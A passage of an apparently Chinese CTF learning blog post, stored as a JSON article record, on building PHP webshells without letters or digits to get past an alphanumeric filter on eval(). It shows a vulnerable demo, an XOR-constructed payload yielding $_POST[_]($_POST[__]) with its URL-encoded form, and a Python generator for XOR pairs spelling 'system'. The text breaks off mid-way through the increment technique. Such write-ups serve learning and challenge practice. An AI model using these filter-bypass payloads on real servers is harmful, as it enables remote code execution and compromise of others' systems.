{"title":"从CTFShow[RCE挑战]中学习自增构造webshell","uid":"882cd13ace786346d67ca526dbf954fe","slug":"从CTFShow[RCE挑战]中学习自增构造webshell","date":"2022-12-07T15:26:30.000Z","updated":"2023-03-14T07:57:46.000Z","comments":true,"path":"api/articles/从CTFShow[RCE挑战]中学习自增构造webshell.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141557237.jpeg","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>在CTFShow的每周挑战中遇到了PHP无数字字母构造的一系列题目，做了做发现我这个菜鸡不怎么会，所以对此类题进行一个简单总结，希望能对正在学习的师傅有所帮助。</p>\n<h1 id=\"构造语句的几种方式\"><a href=\"#构造语句的几种方式\" class=\"headerlink\" title=\"构造语句的几种方式\"></a>构造语句的几种方式</h1><p>首先来看一下最原始的例题</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$code</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'code'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/[A-Za-z0-9]+/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"hacker!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n@<span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>此时的话只是ban了数字和字母，然后这个时候的话想要构造webshell就需要用其他字符了，然后我们这里的话可以用位运算符中的取反、自增来做这个。</p>\n<h2 id=\"异或\"><a href=\"#异或\" class=\"headerlink\" title=\"异或\"></a>异或</h2><p>这里需要先讲一点基础知识。<br>什么是异或，我们这里举一个例子，我们将字符<code>A</code>和<code>?</code>进行异或操作</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'A'</span><span class=\"token operator\">^</span><span class=\"token string single-quoted-string\">'?'</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141557175.png\" alt=\"在这里插入图片描述\"><br>可以发现得到的结果是<code>~</code>，那么它是如何计算的呢，过程如下<br>首先将<code>A</code>和<code>?</code>分别转换为对应的ASCII码，A变为65，?变为63<br>然后将其转换为对应的二进制数，A变为<code>1000001</code>，1变为<code>111111</code><br>接下来就进行运算，异或的运算规则是相同为0，不同为1</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token constant\">A</span><span class=\"token punctuation\">:</span>\t\t<span class=\"token number\">1000001</span>\n<span class=\"token number\">1</span><span class=\"token punctuation\">:</span>\t\t<span class=\"token number\">0111111</span><span class=\"token punctuation\">(</span>少一位，前面补<span class=\"token number\">0</span>即可<span class=\"token punctuation\">)</span> \n结果：\t<span class=\"token number\">1111110</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p>接下来将其二进制转换为对应十进制数，<code>1111110</code>对应的十进制数为<code>126</code>，根据ASCII码表可知126对应的是<code>~</code>，所以这个时候得到的字符就是<code>~</code>。<br>因此，我们利用这种思路，可以借助异或构造payload如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$__</span><span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"#\"</span><span class=\"token operator\">^</span><span class=\"token string double-quoted-string\">\"|\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// _</span>\n<span class=\"token variable\">$__</span><span class=\"token operator\">.=</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\".\"</span><span class=\"token operator\">^</span><span class=\"token string double-quoted-string\">\"~\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// _P</span>\n<span class=\"token variable\">$__</span><span class=\"token operator\">.=</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\"</span><span class=\"token operator\">^</span><span class=\"token string double-quoted-string\">\"`\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// _PO</span>\n<span class=\"token variable\">$__</span><span class=\"token operator\">.=</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"|\"</span><span class=\"token operator\">^</span><span class=\"token string double-quoted-string\">\"/\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// _POS</span>\n<span class=\"token variable\">$__</span><span class=\"token operator\">.=</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"&#123;\"</span><span class=\"token operator\">^</span><span class=\"token string double-quoted-string\">\"/\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// _POST </span>\n<span class=\"token variable\">$$__</span><span class=\"token punctuation\">[</span><span class=\"token constant\">_</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$$__</span><span class=\"token punctuation\">[</span><span class=\"token constant\">__</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// $_POST[_]($_POST[__]);</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>然后我们再取消一下换行符，将它合并于一行之中</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$__</span><span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"#\"</span><span class=\"token operator\">^</span><span class=\"token string double-quoted-string\">\"|\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">.=</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\".\"</span><span class=\"token operator\">^</span><span class=\"token string double-quoted-string\">\"~\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">.=</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\"</span><span class=\"token operator\">^</span><span class=\"token string double-quoted-string\">\"`\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">.=</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"|\"</span><span class=\"token operator\">^</span><span class=\"token string double-quoted-string\">\"/\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">.=</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"&#123;\"</span><span class=\"token operator\">^</span><span class=\"token string double-quoted-string\">\"/\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$$__</span><span class=\"token punctuation\">[</span><span class=\"token constant\">_</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$$__</span><span class=\"token punctuation\">[</span><span class=\"token constant\">__</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>最后进行一次URL编码（因为中间件会进行一次解码，所以我们这里需要手动编码一次），即可得最终payload</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">%</span><span class=\"token number\">24</span>__<span class=\"token operator\">%</span><span class=\"token number\">3</span>D<span class=\"token punctuation\">(</span><span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">23</span><span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">5</span>E<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">7</span>C<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token punctuation\">)</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">24</span>__<span class=\"token operator\">.</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>D<span class=\"token punctuation\">(</span><span class=\"token operator\">%</span><span class=\"token number\">22.</span><span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">5</span>E<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">~</span><span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token punctuation\">)</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">24</span>__<span class=\"token operator\">.</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>D<span class=\"token punctuation\">(</span><span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">2</span>F<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">5</span>E<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">60</span><span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token punctuation\">)</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">24</span>__<span class=\"token operator\">.</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>D<span class=\"token punctuation\">(</span><span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">7</span>C<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">5</span>E<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">2</span>F<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token punctuation\">)</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">24</span>__<span class=\"token operator\">.</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>D<span class=\"token punctuation\">(</span><span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">7</span>B<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">5</span>E<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">2</span>F<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token punctuation\">)</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">24</span><span class=\"token operator\">%</span><span class=\"token number\">24</span>__<span class=\"token operator\">%</span><span class=\"token number\">5</span>B_<span class=\"token operator\">%</span><span class=\"token number\">5</span>D<span class=\"token punctuation\">(</span><span class=\"token operator\">%</span><span class=\"token number\">24</span><span class=\"token operator\">%</span><span class=\"token number\">24</span>__<span class=\"token operator\">%</span><span class=\"token number\">5</span>B__<span class=\"token operator\">%</span><span class=\"token number\">5</span>D<span class=\"token punctuation\">)</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>接下来本地简单测试一下，测试代码为</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$code</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'code'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/[a-zA-Z0-9]/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"hacker!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141557220.png\" alt=\"在这里插入图片描述\"><br>但是这种方式如果自己去慢慢找的话，过程是极为缓慢的，想到我们异或一次不仅能构造出一个字符，也可以一次构造出多个字符，比如<code>(&#39;AB&#39;)^(&#39;11&#39;)</code><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141557170.png\" alt=\"在这里插入图片描述\"><br>此时就可以得到<code>qs</code>字符串，那我们这里是不是就可以构造一个脚本，通过一次异或运算得到我们想构造的字符串，比如<code>system</code>，那这里的话我们大体思路的话就有了</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">第一步：寻找未被过滤的字符\n第二步：写入我们想构造的字符串，然后对它进行一个遍历，先获取第一个字符\n第三步：用刚刚找到的未被过滤的字符进行一个遍历，看哪两个能够通过异或运算构造出第一个字符，同理得到后面的\n第四步：输出时将字符进行一个URL编码，因为涉及到了部分不可见字符<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这里想到之前在CTFShow命令执行系列中用过一个脚本与此类似，这里简单修改一下脚本，就可以达到我们想要的效果了，脚本如下</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> re\n<span class=\"token keyword\">import</span> requests\n<span class=\"token keyword\">import</span> urllib\n<span class=\"token keyword\">from</span> sys <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n<span class=\"token keyword\">import</span> os\n\na<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\nans1<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span> \nans2<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token comment\">#设置i的范围</span>\n    c<span class=\"token operator\">=</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">#将i转换成ascii对应的字符，并赋值给c</span>\n    tmp <span class=\"token operator\">=</span> re<span class=\"token punctuation\">.</span><span class=\"token keyword\">match</span><span class=\"token punctuation\">(</span><span class=\"token string\">r'[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\&#123;|\\&#125;|\\&amp;|\\-'</span><span class=\"token punctuation\">,</span>c<span class=\"token punctuation\">,</span>re<span class=\"token punctuation\">.</span>I<span class=\"token punctuation\">)</span>\n    <span class=\"token comment\">#设置过滤条件，让变量c在其中找对应，并利用修饰符过滤大小写，这样可以得到未被过滤的字符</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>tmp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">continue</span>\n        <span class=\"token comment\">#当执行正确时，那说明这些是被过滤掉的，所以才会被匹配到，此时我们让他继续执行即可</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        a<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span>\n        <span class=\"token comment\">#在数组中增加i，这些就是未被系统过滤掉的字符</span>\n\n<span class=\"token comment\"># eval(\"echo($c);\");</span>\nmya<span class=\"token operator\">=</span><span class=\"token string\">\"system\"</span>  <span class=\"token comment\">#函数名 这里修改！</span>\nmyb<span class=\"token operator\">=</span><span class=\"token string\">\"dir\"</span>      <span class=\"token comment\">#参数</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">myfun</span><span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">,</span>my<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token comment\">#自定义函数</span>\n    <span class=\"token keyword\">global</span> ans1 <span class=\"token comment\">#引用全局变量ans1，使得在局部对其进行更改时不会报错</span>\n    <span class=\"token keyword\">global</span> ans2 <span class=\"token comment\">#引用全局变量ans2，使得在局部对其进行更改时不会报错</span>\n    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token comment\">#设置循环范围为（0，a）注：a为未被过滤的字符数量 </span>\n        <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token comment\">#在上个循环的条件下设置j的范围</span>\n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token operator\">^</span>a<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token operator\">==</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>my<span class=\"token punctuation\">[</span>k<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n                ans1<span class=\"token operator\">+=</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#ans1=ans1+chr(a[i])</span>\n                ans2<span class=\"token operator\">+=</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#ans2=ans2+chr(a[j])</span>\n                <span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span><span class=\"token comment\">#返回循环语句中，重新寻找第二个k，这里的话就是寻找y对应的两个字符</span>\n<span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>mya<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token comment\">#设置k的范围</span>\n    myfun<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span>mya<span class=\"token punctuation\">)</span><span class=\"token comment\">#引用自定义的函数</span>\ndata1<span class=\"token operator\">=</span><span class=\"token string\">\"('\"</span><span class=\"token operator\">+</span>urllib<span class=\"token punctuation\">.</span>request<span class=\"token punctuation\">.</span>quote<span class=\"token punctuation\">(</span>ans1<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">\"'^'\"</span><span class=\"token operator\">+</span>urllib<span class=\"token punctuation\">.</span>request<span class=\"token punctuation\">.</span>quote<span class=\"token punctuation\">(</span>ans2<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">\"')\"</span> <span class=\"token comment\">#data1等于传入的命令,\"+ans1+\"是固定格式，这样可以得到变量对应的值，再用'包裹，这样是变量的固定格式，另一个也是如此，两个在进行URL编码后进行按位与运算，然后得到对应值</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>data1<span class=\"token punctuation\">)</span>\nans1<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span><span class=\"token comment\">#对ans1进行重新赋值</span>\nans2<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span><span class=\"token comment\">#对ans2进行重新赋值</span>\n<span class=\"token keyword\">for</span> k <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>myb<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token comment\">#设置k的范围为(0,len(myb))</span>\n    myfun<span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">,</span>myb<span class=\"token punctuation\">)</span><span class=\"token comment\">#再次引用自定义函数</span>\ndata2<span class=\"token operator\">=</span><span class=\"token string\">\"(\\\"\"</span><span class=\"token operator\">+</span>urllib<span class=\"token punctuation\">.</span>request<span class=\"token punctuation\">.</span>quote<span class=\"token punctuation\">(</span>ans1<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">\"\\\"^\\\"\"</span><span class=\"token operator\">+</span>urllib<span class=\"token punctuation\">.</span>request<span class=\"token punctuation\">.</span>quote<span class=\"token punctuation\">(</span>ans2<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">\"\\\")\"</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>data2<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141557214.png\" alt=\"在这里插入图片描述\"><br>接下来去尝试一下<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141557200.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"自增\"><a href=\"#自增\" class=\"headerlink\" title=\"自增\"></a>自增</h2><p><a href=\"https://www.php.net/manual/zh/language.operators.increment.php\">https://www.php.net/manual/zh/language.operators.increment.php</a><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141557207.png\" alt=\"在这里插入图片描述\"><br>当我们通过某种方法可以得到一个字符时，我们就可以通过自增来获取其他字符，比如现在我们获取到了<code>$_=A</code>，我们进行<code>$_++</code>，此时<code>$_</code>就变成了<code>B</code>，同理就可以构造出<code>GET</code>以及<code>POST</code>字符，接下来以例子来进行讲解,这里例题的话还用之前的demo</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$code</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'code'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/[A-Za-z0-9]+/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"hacker!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n@<span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>我们首先可以写一个<code>[]</code>看一下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$_</span><span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141557565.png\" alt=\"在这里插入图片描述\"><br>这个时候的话可以看到它就是一个数组，我们无法获取它的这个<code>Array</code>字符，那我们该怎么获取呢，我们尝试拼接一个数字</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$_</span><span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'1'</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141557600.png\" alt=\"在这里插入图片描述\"><br>这里看到输出的是<code>Array1</code>，我们这里是不允许出现数字的，但我们直接拼接个空是不是也是可行的呢，尝试一下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$_</span><span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141557612.png\" alt=\"在这里插入图片描述\"><br>成功获取到了字符<code>Array</code>，然后我们获取想获取A的话，就可以采用<code>$_[0]</code>这种方式来获取，但我们是不能够写数字的，所以我们这里可以用一个判断,比如我们在<code>[]</code>里加一个<code>==$</code>，此时因为<code>空</code>和<code>$</code>不同，它就会输出<code>0</code>，此时也就等同于<code>$_[0]</code>，具体实现代码如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$_</span><span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$_</span><span class=\"token operator\">=</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">''</span><span class=\"token operator\">==</span><span class=\"token string single-quoted-string\">'$'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" 